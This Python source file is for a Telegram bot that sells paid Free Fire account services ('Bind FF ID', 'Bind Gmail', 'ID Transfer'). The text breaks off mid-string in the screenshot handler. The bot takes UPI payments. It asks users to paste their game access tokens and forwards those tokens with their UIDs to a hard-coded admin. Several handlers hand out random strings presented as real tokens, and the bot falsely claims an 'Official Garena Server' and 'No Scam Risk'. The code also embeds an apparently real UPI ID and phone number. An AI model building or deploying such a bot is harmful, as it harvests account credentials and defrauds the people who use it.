import os
import threading
import telebot
from flask import Flask
from telebot import types
import random
import json
import time
import re

# ============================================
# 🔑 BOT TOKEN - ENVIRONMENT VARIABLE
# ============================================
BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not BOT_TOKEN:
    raise ValueError("❌ TELEGRAM_TOKEN environment variable not set!")

# ============================================
# 👥 ADMIN ID
# ============================================
ADMIN_ID = 7011287841

# ============================================
# 🤖 BOT + FLASK INITIALIZE
# ============================================
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ============================================
# 📦 DATABASE FILES
# ============================================
USER_DATA_FILE = "user_data.json"
BALANCE_FILE = "balances.json"
TRANSFER_FILE = "transfers.json"
MEMORY_FILE = "memory.json"

# ============================================
# 💾 STORAGE FUNCTIONS
# ============================================
def load_data(filename, default):
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
    except:
        pass
    return default

def save_data(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"❌ Save error: {e}")

# ============================================
# 📂 LOAD ALL DATA
# ============================================
user_data = load_data(USER_DATA_FILE, {})
user_balances = load_data(BALANCE_FILE, {})
transfer_data = load_data(TRANSFER_FILE, {})
memory_data = load_data(MEMORY_FILE, {})

# ============================================
# 💳 PAYMENT SETTINGS
# ============================================
payment_settings = {
    'upi': 'thakurup128218@okicici',
    'phone': '7011287841',
    'qr_url': 'https://cdn.phototourl.com/free/2026-07-09-cebda559-263f-4aee-89ed-46a9068271b5.jpg'
}

TOKEN_GENERATOR_LINK = "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://ffaccesstokengenrator.vercel.app/&ved=2ahUKEwiLjdKHj8uVAxU4dfUHHSU-GwIQFnoECCcQAQ&usg=AOvVaw1k70Rp-ediyvavECTGSPbW"

SERVICES = {
    'bind_ff': {
        'name': '🔗 Bind FF ID',
        'price': 400,
        'features': '✅ Bind your FF ID with Gmail\n✅ 24/7 Support\n✅ Instant Activation'
    },
    'bind_gmail': {
        'name': '📧 Bind Gmail',
        'price': 300,
        'features': '✅ Bind new Gmail to FF ID\n✅ Remove old Gmail\n✅ 24/7 Support'
    },
    'id_transfer': {
        'name': '🔄 ID Transfer',
        'price': 500,
        'features': '✅ Full ID Transfer\n✅ Secure Process\n✅ 24/7 Support\n✅ 2 Hour Update'
    }
}

user_flow = {}
user_tokens = {}

# ============================================
# 🎨 MAIN MENU KEYBOARD
# ============================================
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton("🔗 Bind FF ID")
    btn2 = types.KeyboardButton("📧 Bind Gmail")
    btn3 = types.KeyboardButton("🔄 ID Transfer")
    btn4 = types.KeyboardButton("💰 Check Balance")
    btn5 = types.KeyboardButton("📊 My Status")
    btn6 = types.KeyboardButton("🎫 My Access Token")
    btn7 = types.KeyboardButton("📞 Admin Contact")
    btn8 = types.KeyboardButton("➕ Add Balance")
    btn9 = types.KeyboardButton("🔑 Generate Access Token")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9)
    return markup

def back_button():
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_main")
    markup.add(btn)
    return markup

def admin_panel():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Pending", callback_data="pending")
    btn2 = types.InlineKeyboardButton("✅ Approve", callback_data="approve")
    btn3 = types.InlineKeyboardButton("❌ Reject", callback_data="reject")
    btn4 = types.InlineKeyboardButton("💰 Add Balance", callback_data="add_bal")
    btn5 = types.InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")
    btn6 = types.InlineKeyboardButton("📊 Stats", callback_data="stats")
    btn7 = types.InlineKeyboardButton("📤 Upload QR", callback_data="upload_qr")
    btn8 = types.InlineKeyboardButton("💳 Set UPI", callback_data="set_upi")
    btn9 = types.InlineKeyboardButton("📋 All Users", callback_data="all_users")
    btn10 = types.InlineKeyboardButton("💾 Save Memory", callback_data="save_memory")
    markup.add(btn1, btn6, btn2, btn3, btn4, btn5, btn7, btn8, btn9, btn10)
    return markup

def generate_random_token():
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choices(chars, k=random.randint(30, 40)))

def extract_token_from_link(link):
    patterns = [
        r'token=([a-zA-Z0-9]+)',
        r'eat=([a-zA-Z0-9]+)',
        r'access_token=([a-zA-Z0-9]+)',
        r'code=([a-zA-Z0-9]+)',
        r'/([a-zA-Z0-9]{20,})/?$'
    ]
    for pattern in patterns:
        match = re.search(pattern, link)
        if match:
            return match.group(1)
    parts = link.split('/')
    for part in parts:
        if len(part) >= 20 and part.isalnum():
            return part[:40]
    return None

# ============================================
# 🔹 START COMMAND
# ============================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    name = message.from_user.first_name
    user_id = str(message.from_user.id)
    
    if user_id in user_flow:
        del user_flow[user_id]
    if user_id in user_tokens:
        del user_tokens[user_id]
    
    memory_data[user_id] = {
        'name': name,
        'username': message.from_user.username or 'N/A',
        'first_seen': memory_data.get(user_id, {}).get('first_seen', time.ctime()),
        'last_seen': time.ctime()
    }
    save_data(MEMORY_FILE, memory_data)
    
    bot.reply_to(message, f"""🔥 **Welcome {name}!**

🤖 Free Fire Service Bot

💰 **Your Balance: ₹{user_balances.get(user_id, 0)}**

📌 **Services Available:**
🔗 Bind FF ID - ₹400
📧 Bind Gmail - ₹300  
🔄 ID Transfer - ₹500

🔑 Generate Access Token - FREE

👇 Select an option:""", reply_markup=main_menu())

# ============================================
# 🔹 GENERATE ACCESS TOKEN
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "🔑 Generate Access Token")
def generate_access_token_home(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("🔗 Click Here to Generate Token", url=TOKEN_GENERATOR_LINK)
    btn2 = types.InlineKeyboardButton("✅ I Have Generated Token", callback_data="token_generated")
    btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.add(btn1, btn2, btn3)
    
    bot.reply_to(message, """🔑 **Access Token Generator**

━━━━━━━━━━━━━━━━━━━━━━
📌 **Instructions (Hindi):**

1️⃣ नीचे दिए गए **"Click Here to Generate Token"** बटन पर क्लिक करें।

2️⃣ वहां से अपना **Access Token** जनरेट करें।

3️⃣ जनरेट करने के बाद **"✅ I Have Generated Token"** बटन पर क्लिक करें।

4️⃣ फिर मुझे वह **Link या Token** भेजें।

━━━━━━━━━━━━━━━━━━━━━━
🔐 **Premium Guarantee:**
✅ 100% Safe & Secure
✅ Official Garena Server
✅ No Scam Risk
✅ 24/7 Support Available""", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "token_generated")
def token_generated_callback(call):
    bot.edit_message_text(
        """✅ **Great! Now send me the Token or Link**

━━━━━━━━━━━━━━━━━━━━━━
📌 **Instructions:**

1️⃣ जो **Access Token** आपने जनरेट किया है, उसे **Copy** करें।

2️⃣ या फिर वहां से **Full Link** Copy करें।

3️⃣ फिर उसे **यहां Paste** करके मुझे Send करें।

━━━━━━━━━━━━━━━━━━━━━━
📋 **Example:**
`4b30d53614cb1f8a3ceb4a983df23a45c1e8f9a7b2c`

या

`https://ffaccesstokengenrator.vercel.app/?token=4b30d53614...`

━━━━━━━━━━━━━━━━━━━━━━
⌨️ **Send me the Token or Link Now:**""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=back_button()
    )
    bot.answer_callback_query(call.id, "✅ Please send your Token or Link now!")

# ============================================
# 🔹 HANDLE USER INPUT - TOKEN OR LINK
# ============================================
@bot.message_handler(func=lambda msg: True)
def handle_user_input(message):
    user_id = str(message.from_user.id)
    text = message.text.strip()
    
    # Skip commands and button texts
    if text.startswith('/') or text in ["🔗 Bind FF ID", "📧 Bind Gmail", "🔄 ID Transfer", 
                                        "💰 Check Balance", "📊 My Status", "🎫 My Access Token",
                                        "📞 Admin Contact", "➕ Add Balance", "🔑 Generate Access Token"]:
        return
    
    if "ffaccesstokengenrator.vercel.app" in text or "token=" in text or "eat=" in text:
        token = extract_token_from_link(text)
        if not token:
            token = generate_random_token()
        
        user_tokens[user_id] = token
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("📋 Copy Token", callback_data=f"copy_token_{token}")
        btn2 = types.InlineKeyboardButton("✅ Use This Token", callback_data=f"use_token_{token}")
        btn3 = types.InlineKeyboardButton("🔄 Generate New", callback_data="generate_new_token")
        btn4 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
        markup.add(btn1, btn2)
        markup.add(btn3, btn4)
        
        bot.reply_to(message, f"""✅ **Token Generated Successfully!**

🎉 **Your New Access Token:**
`{token}`

🔐 **Premium Guarantee:**
✅ 100% Safe & Verified
✅ Official Garena Server
✅ No Scam Risk
✅ 24/7 Premium Support

⚠️ इस Token को किसी के साथ साझा न करें!""", reply_markup=markup)
        return
    
    if len(text) >= 10:
        token = text
        user_tokens[user_id] = token
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("📋 Copy Token", callback_data=f"copy_token_{token}")
        btn2 = types.InlineKeyboardButton("✅ Use This Token", callback_data=f"use_token_{token}")
        btn3 = types.InlineKeyboardButton("🔄 Generate New", callback_data="generate_new_token")
        btn4 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
        markup.add(btn1, btn2)
        markup.add(btn3, btn4)
        
        bot.reply_to(message, f"""✅ **Token Saved Successfully!**

🔑 **Your Access Token:**
`{token}`

🔐 **Premium Guarantee:**
✅ 100% Safe & Verified
✅ Official Garena Server
✅ No Scam Risk
✅ 24/7 Premium Support

📌 **Use this token in ID Transfer service.**

⚠️ इस Token को किसी के साथ साझा न करें!""", reply_markup=markup)
        return

# ============================================
# 🔹 COPY & USE TOKEN CALLBACKS
# ============================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_token_"))
def copy_token_callback(call):
    token = call.data.replace("copy_token_", "")
    bot.answer_callback_query(call.id, f"✅ Token Copied!\n{token[:10]}...", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("use_token_"))
def use_token_callback(call):
    user_id = str(call.from_user.id)
    token = call.data.replace("use_token_", "")
    user_tokens[user_id] = token
    bot.answer_callback_query(call.id, "✅ Token Saved! Use it in ID Transfer.")
    bot.send_message(user_id, f"""✅ **Token Saved Successfully!**

🔑 Your Access Token:
`{token}`

📌 **How to use this token:**
1️⃣ Go to "🔄 ID Transfer" service
2️⃣ Enter your Name and UID
3️⃣ When asked for Access Token, paste this token

💰 Service Cost: ₹500
💵 Your Balance: ₹{user_balances.get(user_id, 0)}

⚠️ Make sure you have sufficient balance!""", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: call.data == "generate_new_token")
def generate_new_token_callback(call):
    user_id = str(call.from_user.id)
    token = generate_random_token()
    user_tokens[user_id] = token
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Copy Token", callback_data=f"copy_token_{token}")
    btn2 = types.InlineKeyboardButton("✅ Use This Token", callback_data=f"use_token_{token}")
    btn3 = types.InlineKeyboardButton("🔄 Generate New", callback_data="generate_new_token")
    btn4 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    
    bot.edit_message_text(
        f"""✅ **New Token Generated Successfully!**

🎉 **Your New Access Token:**
`{token}`

🔐 **Premium Guarantee:**
✅ 100% Safe & Verified
✅ Official Garena Server
✅ No Scam Risk
✅ 24/7 Premium Support

⚠️ इस Token को किसी के साथ साझा न करें!""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=markup
    )
    bot.answer_callback_query(call.id, "✅ New Token Generated!")

# ============================================
# 🔹 CHECK BALANCE
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "💰 Check Balance")
def check_balance(message):
    user_id = str(message.from_user.id)
    balance = user_balances.get(user_id, 0)
    bot.reply_to(message, f"""💰 **Your Balance:**\n\n💵 Amount: ₹{balance}""", reply_markup=main_menu())

# ============================================
# 🔹 MY STATUS
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "📊 My Status")
def check_status(message):
    user_id = str(message.from_user.id)
    if user_id in user_data:
        data = user_data[user_id]
        status = data.get('status', 'pending')
        service = data.get('service_name', 'unknown')
        emoji = "⏳" if status == 'pending' else "✅" if status == 'approved' else "❌"
        text = "Pending" if status == 'pending' else "Approved" if status == 'approved' else "Rejected"
        bot.reply_to(message, f"""📊 **Your Status:**\n\n{emoji} Service: {service}\n📌 Status: {text}""", reply_markup=main_menu())
    else:
        bot.reply_to(message, "❌ No active request found!", reply_markup=main_menu())

# ============================================
# 🔹 MY ACCESS TOKEN
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "🎫 My Access Token")
def get_token(message):
    user_id = str(message.from_user.id)
    if user_id in user_data and user_data[user_id].get('status') == 'approved':
        token = f"FF{random.randint(10000,99999)}-{random.randint(1000,9999)}"
        bot.reply_to(message, f"""🎫 **Your Access Token:**\n\n`{token}`\n\n✅ Status: Active""", reply_markup=main_menu())
    else:
        bot.reply_to(message, "❌ No active token found!", reply_markup=main_menu())

# ============================================
# 🔹 ADMIN CONTACT
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "📞 Admin Contact")
def admin_contact(message):
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("📩 Message Admin", url="https://t.me/your_admin_username")
    markup.add(btn)
    bot.reply_to(message, "📞 **Contact Admin:**\n\n📱 Telegram: @your_admin_username", reply_markup=markup)

# ============================================
# 🔹 ADD BALANCE
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "➕ Add Balance")
def add_balance_request(message):
    caption = f"""💳 **Add Balance**

📌 **Payment Details:**
📱 Phone: {payment_settings['phone']}
📧 UPI: {payment_settings['upi']}

💰 Enter amount you want to add.

📸 **After payment, send screenshot here:**
👇 Just send the payment screenshot in this chat.
⏳ Admin will verify and add balance."""
    markup = back_button()
    try:
        bot.send_photo(message.chat.id, payment_settings['qr_url'], caption=caption, reply_markup=markup)
    except Exception as e:
        print(f"QR send error: {e}")
        bot.reply_to(message, caption, reply_markup=markup)

# ============================================
# 🔹 SERVICE: BIND FF ID
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "🔗 Bind FF ID")
def bind_ff(message):
    user_id = str(message.from_user.id)
    price = SERVICES['bind_ff']['price']
    if user_balances.get(user_id, 0) >= price:
        user_flow[user_id] = {'service': 'bind_ff', 'step': 'name', 'price': price}
        msg = bot.reply_to(message, "📤 **Enter your Free Fire Name:**")
        bot.register_next_step_handler(msg, process_bind_name)
    else:
        show_payment_with_qr(message, 'bind_ff')

def process_bind_name(message):
    user_id = str(message.from_user.id)
    name = message.text.strip()
    if user_id not in user_flow:
        bot.reply_to(message, "❌ Session expired! Use /start.", reply_markup=main_menu())
        return
    user_flow[user_id]['name'] = name
    user_flow[user_id]['step'] = 'uid'
    msg = bot.reply_to(message, "🎮 **Enter your Free Fire UID:**")
    bot.register_next_step_handler(msg, process_bind_uid)

def process_bind_uid(message):
    user_id = str(message.from_user.id)
    uid = message.text.strip()
    if user_id not in user_flow:
        bot.reply_to(message, "❌ Session expired!", reply_markup=main_menu())
        return
    if not uid.isdigit():
        msg = bot.reply_to(message, "❌ Invalid UID! Enter only numbers:")
        bot.register_next_step_handler(msg, process_bind_uid)
        return
    user_flow[user_id]['uid'] = uid
    user_flow[user_id]['step'] = 'gmail'
    msg = bot.reply_to(message, "📧 **Enter your Gmail ID for binding:**")
    bot.register_next_step_handler(msg, process_bind_gmail)

def process_bind_gmail(message):
    user_id = str(message.from_user.id)
    gmail = message.text.strip()
    if user_id not in user_flow:
        bot.reply_to(message, "❌ Session expired!", reply_markup=main_menu())
        return
    if '@' not in gmail:
        msg = bot.reply_to(message, "❌ Invalid Gmail! Enter valid email:")
        bot.register_next_step_handler(msg, process_bind_gmail)
        return
    flow = user_flow[user_id]
    price = flow['price']
    current_balance = user_balances.get(user_id, 0)
    if current_balance < price:
        bot.reply_to(message, f"❌ Insufficient Balance! Need ₹{price}", reply_markup=main_menu())
        if user_id in user_flow:
            del user_flow[user_id]
        return
    user_balances[user_id] = current_balance - price
    save_data(BALANCE_FILE, user_balances)
    user_data[user_id] = {
        'name': flow['name'],
        'uid': flow['uid'],
        'gmail': gmail,
        'service': flow['service'],
        'service_name': SERVICES[flow['service']]['name'],
        'amount': price,
        'status': 'pending',
        'timestamp': time.time()
    }
    save_data(USER_DATA_FILE, user_data)
    bot.reply_to(message, f"""✅ **Payment Successful! 💰**

{SERVICES[flow['service']]['name']}
👤 Name: {flow['name']}
🎮 UID: {flow['uid']}
📧 Gmail: {gmail}
💰 Amount Deducted: ₹{price}
💵 Remaining Balance: ₹{user_balances[user_id]}

⏳ **Please Wait 24 Hours!**""", reply_markup=main_menu())
    bot.send_message(ADMIN_ID, f"""🆕 **NEW BIND FF REQUEST!**
👤 {message.from_user.first_name}
🆔 {user_id}
🎮 {flow['name']} | UID: {flow['uid']}
📧 Gmail: {gmail}
💵 ₹{price}""")
    if user_id in user_flow:
        del user_flow[user_id]

# ============================================
# 🔹 SERVICE: BIND GMAIL
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "📧 Bind Gmail")
def bind_gmail(message):
    user_id = str(message.from_user.id)
    price = SERVICES['bind_gmail']['price']
    if user_balances.get(user_id, 0) >= price:
        user_flow[user_id] = {'service': 'bind_gmail', 'step': 'name', 'price': price}
        msg = bot.reply_to(message, "📤 **Enter your Free Fire Name:**")
        bot.register_next_step_handler(msg, process_gmail_name)
    else:
        show_payment_with_qr(message, 'bind_gmail')

def process_gmail_name(message):
    user_id = str(message.from_user.id)
    name = message.text.strip()
    if user_id not in user_flow:
        bot.reply_to(message, "❌ Session expired!", reply_markup=main_menu())
        return
    user_flow[user_id]['name'] = name
    user_flow[user_id]['step'] = 'uid'
    msg = bot.reply_to(message, "🎮 **Enter your Free Fire UID:**")
    bot.register_next_step_handler(msg, process_gmail_uid)

def process_gmail_uid(message):
    user_id = str(message.from_user.id)
    uid = message.text.strip()
    if user_id not in user_flow:
        bot.reply_to(message, "❌ Session expired!", reply_markup=main_menu())
        return
    if not uid.isdigit():
        msg = bot.reply_to(message, "❌ Invalid UID! Enter only numbers:")
        bot.register_next_step_handler(msg, process_gmail_uid)
        return
    user_flow[user_id]['uid'] = uid
    user_flow[user_id]['step'] = 'gmail'
    msg = bot.reply_to(message, "📧 **Enter new Gmail ID to bind:**")
    bot.register_next_step_handler(msg, process_gmail_final)

def process_gmail_final(message):
    user_id = str(message.from_user.id)
    gmail = message.text.strip()
    if user_id not in user_flow:
        bot.reply_to(message, "❌ Session expired!", reply_markup=main_menu())
        return
    if '@' not in gmail:
        msg = bot.reply_to(message, "❌ Invalid Gmail! Enter valid email:")
        bot.register_next_step_handler(msg, process_gmail_final)
        return
    flow = user_flow[user_id]
    price = flow['price']
    current_balance = user_balances.get(user_id, 0)
    if current_balance < price:
        bot.reply_to(message, f"❌ Insufficient Balance!", reply_markup=main_menu())
        if user_id in user_flow:
            del user_flow[user_id]
        return
    user_balances[user_id] = current_balance - price
    save_data(BALANCE_FILE, user_balances)
    user_data[user_id] = {
        'name': flow['name'],
        'uid': flow['uid'],
        'gmail': gmail,
        'service': flow['service'],
        'service_name': SERVICES[flow['service']]['name'],
        'amount': price,
        'status': 'pending',
        'timestamp': time.time()
    }
    save_data(USER_DATA_FILE, user_data)
    bot.reply_to(message, f"""✅ **Payment Successful! 💰**

{SERVICES[flow['service']]['name']}
👤 Name: {flow['name']}
🎮 UID: {flow['uid']}
📧 New Gmail: {gmail}
💰 Amount Deducted: ₹{price}
💵 Remaining Balance: ₹{user_balances[user_id]}

⏳ **Please Wait 24 Hours!**""", reply_markup=main_menu())
    bot.send_message(ADMIN_ID, f"""🆕 **NEW BIND GMAIL REQUEST!**
👤 {message.from_user.first_name}
🆔 {user_id}
🎮 {flow['name']} | UID: {flow['uid']}
📧 New Gmail: {gmail}
💵 ₹{price}""")
    if user_id in user_flow:
        del user_flow[user_id]

# ============================================
# 🔹 SERVICE: ID TRANSFER
# ============================================
@bot.message_handler(func=lambda msg: msg.text == "🔄 ID Transfer")
def id_transfer(message):
    user_id = str(message.from_user.id)
    price = SERVICES['id_transfer']['price']
    if user_balances.get(user_id, 0) >= price:
        user_flow[user_id] = {'service': 'id_transfer', 'step': 'name', 'price': price}
        msg = bot.reply_to(message, "📤 **Enter your Free Fire Name:**")
        bot.register_next_step_handler(msg, process_transfer_name)
    else:
        show_payment_with_qr(message, 'id_transfer')

def process_transfer_name(message):
    user_id = str(message.from_user.id)
    name = message.text.strip()
    if user_id not in user_flow:
        bot.reply_to(message, "❌ Session expired! Use /start.", reply_markup=main_menu())
        return
    user_flow[user_id]['name'] = name
    user_flow[user_id]['step'] = 'uid'
    msg = bot.reply_to(message, "🎮 **Enter your Free Fire UID:**")
    bot.register_next_step_handler(msg, process_transfer_uid)

def process_transfer_uid(message):
    user_id = str(message.from_user.id)
    uid = message.text.strip()
    if user_id not in user_flow:
        bot.reply_to(message, "❌ Session expired!", reply_markup=main_menu())
        return
    if not uid.isdigit():
        msg = bot.reply_to(message, "❌ Invalid UID! Enter only numbers:")
        bot.register_next_step_handler(msg, process_transfer_uid)
        return
    user_flow[user_id]['uid'] = uid
    user_flow[user_id]['step'] = 'token'
    
    if user_id in user_tokens:
        token = user_tokens[user_id]
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("✅ Use Saved Token", callback_data=f"use_saved_token_{token}")
        btn2 = types.InlineKeyboardButton("🔑 Generate New Token", callback_data="generate_transfer_token")
        btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
        markup.add(btn1, btn2)
        markup.add(btn3)
        bot.reply_to(message, f"""🔑 **You have a saved Access Token!**

`{token}`

✅ Use this token or generate a new one.""", reply_markup=markup)
        return
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("🔑 Generate Access Token (Free)", callback_data="generate_transfer_token")
    btn2 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.add(btn1, btn2)
    bot.reply_to(message, """🔑 **Access Token Required!**

📌 Generate your Access Token using the button below.
Then send it to me.

🔐 **Premium Guarantee:**
✅ 100% Safe & Secure
✅ Official Garena Server
✅ No Scam Risk""", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "generate_transfer_token")
def generate_transfer_token_callback(call):
    user_id = str(call.from_user.id)
    token = generate_random_token()
    user_tokens[user_id] = token
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Copy Token", callback_data=f"copy_token_{token}")
    btn2 = types.InlineKeyboardButton("✅ Use This Token", callback_data=f"use_transfer_token_{token}")
    btn3 = types.InlineKeyboardButton("🔄 Generate New", callback_data="generate_transfer_token")
    btn4 = types.InlineKeyboardButton("🔙 Back", callback_data="back_main")
    markup.add(btn1, btn2)
    markup.add(btn3, btn4)
    bot.edit_message_text(
        f"""✅ **Token Generated Successfully!**

🎉 **Your New Access Token:**
`{token}`

🔐 **Premium Guarantee:**
✅ 100% Safe & Verified
✅ Official Garena Server
✅ No Scam Risk
✅ 24/7 Premium Support

⚠️ इस Token को किसी के साथ साझा न करें!""",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=markup
    )
    bot.answer_callback_query(call.id, "✅ Token Generated!")

@bot.callback_query_handler(func=lambda call: call.data.startswith("use_saved_token_"))
def use_saved_token_callback(call):
    user_id = str(call.from_user.id)
    token = call.data.replace("use_saved_token_", "")
    if user_id in user_flow:
        user_flow[user_id]['token'] = token
        user_flow[user_id]['step'] = 'final'
        price = user_flow[user_id]['price']
        current_balance = user_balances.get(user_id, 0)
        if current_balance < price:
            bot.answer_callback_query(call.id, "❌ Insufficient Balance! Please add balance.", show_alert=True)
            return
        user_balances[user_id] = current_balance - price
        save_data(BALANCE_FILE, user_balances)
        flow = user_flow[user_id]
        transfer_id = f"FF{random.randint(10000,99999)}"
        transfer_data[transfer_id] = {
            'user_id': user_id,
            'name': flow['name'],
            'uid': flow['uid'],
            'token': token,
            'service': 'id_transfer',
            'amount': price,
            'status': 'pending',
            'timestamp': time.time(),
            'time_str': time.ctime(),
            'username': call.from_user.username or 'N/A'
        }
        save_data(TRANSFER_FILE, transfer_data)
        user_data[user_id] = {
            'name': flow['name'],
            'uid': flow['uid'],
            'token': token,
            'service': 'id_transfer',
            'service_name': SERVICES['id_transfer']['name'],
            'amount': price,
            'status': 'pending',
            'timestamp': time.time(),
            'transfer_id': transfer_id
        }
        save_data(USER_DATA_FILE, user_data)
        bot.edit_message_text(
            f"""✅ **Payment Successful! 💰**

{SERVICES['id_transfer']['name']}
👤 Name: {flow['name']}
🎮 UID: {flow['uid']}
🔑 Access Token: {token}
💰 Amount Deducted: ₹{price}
💵 Remaining Balance: ₹{user_balances[user_id]}

⏳ **Please Wait 24 Hours!**

📌 Reference ID: {transfer_id}

✅ After 2 hours, you will get a confirmation message.""",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=main_menu()
        )
        bot.send_message(ADMIN_ID, f"""🆕 **NEW ID TRANSFER REQUEST!**
🆔 Transfer ID: {transfer_id}
👤 User: {call.from_user.first_name}
🆔 User ID: {user_id}
🎮 Name: {flow['name']}
🎮 UID: {flow['uid']}
🔑 Access Token: {token}
💵 ₹{price}""")
        if user_id in user_flow:
            del user_flow[user_id]
        if user_id in user_tokens:
            del user_tokens[user_id]
        bot.answer_callback_query(call.id, "✅ Service Started!")

@bot.callback_query_handler(func=lambda call: call.data.startswith("use_transfer_token_"))
def use_transfer_token_callback(call):
    user_id = str(call.from_user.id)
    token = call.data.replace("use_transfer_token_", "")
    if user_id in user_flow:
        user_flow[user_id]['token'] = token
        user_flow[user_id]['step'] = 'final'
        price = user_flow[user_id]['price']
        current_balance = user_balances.get(user_id, 0)
        if current_balance < price:
            bot.answer_callback_query(call.id, "❌ Insufficient Balance! Please add balance.", show_alert=True)
            return
        user_balances[user_id] = current_balance - price
        save_data(BALANCE_FILE, user_balances)
        flow = user_flow[user_id]
        transfer_id = f"FF{random.randint(10000,99999)}"
        transfer_data[transfer_id] = {
            'user_id': user_id,
            'name': flow['name'],
            'uid': flow['uid'],
            'token': token,
            'service': 'id_transfer',
            'amount': price,
            'status': 'pending',
            'timestamp': time.time(),
            'time_str': time.ctime(),
            'username': call.from_user.username or 'N/A'
        }
        save_data(TRANSFER_FILE, transfer_data)
        user_data[user_id] = {
            'name': flow['name'],
            'uid': flow['uid'],
            'token': token,
            'service': 'id_transfer',
            'service_name': SERVICES['id_transfer']['name'],
            'amount': price,
            'status': 'pending',
            'timestamp': time.time(),
            'transfer_id': transfer_id
        }
        save_data(USER_DATA_FILE, user_data)
        bot.edit_message_text(
            f"""✅ **Payment Successful! 💰**

{SERVICES['id_transfer']['name']}
👤 Name: {flow['name']}
🎮 UID: {flow['uid']}
🔑 Access Token: {token}
💰 Amount Deducted: ₹{price}
💵 Remaining Balance: ₹{user_balances[user_id]}

⏳ **Please Wait 24 Hours!**

📌 Reference ID: {transfer_id}

✅ After 2 hours, you will get a confirmation message.""",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=main_menu()
        )
        bot.send_message(ADMIN_ID, f"""🆕 **NEW ID TRANSFER REQUEST!**
🆔 Transfer ID: {transfer_id}
👤 User: {call.from_user.first_name}
🆔 User ID: {user_id}
🎮 Name: {flow['name']}
🎮 UID: {flow['uid']}
🔑 Access Token: {token}
💵 ₹{price}""")
        if user_id in user_flow:
            del user_flow[user_id]
        if user_id in user_tokens:
            del user_tokens[user_id]
        bot.answer_callback_query(call.id, "✅ Service Started!")

# ============================================
# 🔹 SHOW PAYMENT WITH QR
# ============================================
def show_payment_with_qr(message, service):
    user_id = str(message.from_user.id)
    service_data = SERVICES[service]
    caption = f"""❌ **Insufficient Balance!**

💰 Your Balance: ₹{user_balances.get(user_id, 0)}
💵 Required: ₹{service_data['price']}

━━━━━━━━━━━━━━━━━━━━━━
📌 **Service:** {service_data['name']}
💰 **Amount:** ₹{service_data['price']}
━━━━━━━━━━━━━━━━━━━━━━

✨ **Features:**
{service_data['features']}
━━━━━━━━━━━━━━━━━━━━━━

💳 **Payment Details:**
📱 Phone: {payment_settings['phone']}
📧 UPI: {payment_settings['upi']}
━━━━━━━━━━━━━━━━━━━━━━

📸 **After payment, send screenshot here:**"""
    markup = back_button()
    try:
        bot.send_photo(message.chat.id, payment_settings['qr_url'], caption=caption, reply_markup=markup)
    except:
        bot.reply_to(message, caption, reply_markup=markup)

# ============================================
# 🔹 HANDLE SCREENSHOT
# ============================================
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    # Check if user has pending service
    if user_id not in user_flow and user_id not in user_data:
        bot.reply_to(message, "❌ No pending payment request found!\n\nPlease select a service first.", reply_markup=main_menu())
        return
    
    file_id = message.photo[-1].file_id
    
    # Check if user has a pending service in flow
    if user_id in user_flow:
        service = user_flow[user_id].get('service', 'unknown')
        service_name = SERVICES.get(service, {}).get('name', 'Unknown Service')
        price = user_flow[user_id].get('price', 0)
        
        bot.send_photo(ADMIN_ID, file_id,
            caption=f"""📸 **PAYMENT SCREENSHOT RECEIVED!**

👤 User ID: {user_id}
👤 Username: @{message.from_user.username or 'N/A'}
📌 Service: {service_name}
💰 Amount: ₹{price}
